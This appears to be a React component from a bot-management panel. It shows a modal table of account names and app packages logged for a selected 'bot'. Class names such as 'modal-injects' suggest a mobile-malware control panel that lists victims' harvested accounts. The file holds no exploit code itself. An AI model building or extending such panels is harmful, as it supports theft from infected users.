import React, {useEffect} from "react";
import {BotModalProps} from "../../../Model/Modal";
import {Button, Modal, Table} from "antd";
import {useDispatch, useSelector} from "react-redux";
import {AppState} from "../../../Store/RootReducer";
import {getLogsList} from "../../../Store/Logs/Actions";
import {getApiUrl} from "../../../Util/config";
import {RedoOutlined} from "@ant-design/icons";

interface AccountLog {
    account: string,
    application: string,
    image: string,
}

const GetAccounts: React.FC<BotModalProps> = (props: BotModalProps) => {
    const logsReducer = useSelector((state: AppState) => state.logs);
    const dispatch = useDispatch();

    useEffect(() => {
        if (props.visible) {
            dispatch(getLogsList("otheraccounts", props.bot.id, null, logsReducer.filters, logsReducer.sort, 1));
        }
    }, [dispatch, props.bot.id, props.visible]);

    const closeModal = () => props.setVisible(false);

    const refreshAppsList = () => {
        dispatch(getLogsList("otheraccounts", props.bot.id, null, logsReducer.filters, logsReducer.sort, 1));
    };

    const columns = [
        {
            title: "Package",
            dataIndex: "application",
            key: "application",
            render: (text: string, log: AccountLog) => {
                return (
                    <div className="table-col">
                        <div className="table-col-item">
                            <b>Account</b>
                        </div>
                        <div className="table-col-item">
                            <div style={{display: "flex", alignItems: "center", gap: 8}}>
                                <img
                                    src={getApiUrl(log.image)}
                                    width={16}
                                    alt={log.application}
                                />

                                {log.application}
                            </div>
                        </div>
                    </div>
                );
            },
        },
        {
            title: "Account",
            dataIndex: "account",
            key: "account",
            render: (account: any, log: AccountLog) => {
                return (
                    <div className="table-col">
                        <div className="table-col-item">
                            <b>Package</b>
                        </div>
                        <div className="table-col-item">
                            <code>{log.account}</code>
                        </div>
                    </div>
                );
            },
        },
    ];


    let dataSource: AccountLog[];

    if (logsReducer.logs.length > 0) {
        dataSource = (logsReducer.logs[0].log) as unknown as AccountLog[];
    } else {
        dataSource= [];
    }

    const isLoaded = logsReducer.isLoaded && logsReducer.type === "otheraccounts" && logsReducer.botId === props.bot.id;

    return (
        <Modal
            title="Show accounts 2"
            visible={props.visible}
            onCancel={closeModal}
            width={400}
            className="modal-injects"
            destroyOnClose
            footer={(
                <>
                    <Button
                        type="primary"
                        onClick={refreshAppsList}
                        icon={<RedoOutlined/>}
                    >
                        Refresh list
                    </Button>
                    <Button
                        type="primary"
                        onClick={closeModal}
                        danger
                    >
                        Close
                    </Button>
                </>
            )}
        >
            <div className="table-scroll" style={{maxHeight: 250, overflowY: "auto"}}>
                <Table
                    columns={columns}
                    dataSource={isLoaded ? dataSource : []}
                    loading={!isLoaded}
                    size="small"
                    pagination={false}
                    sticky={true}
                    className="not-responsive"
                    rowKey="id"
                />
            </div>
        </Modal>
    );
};

export default GetAccounts;
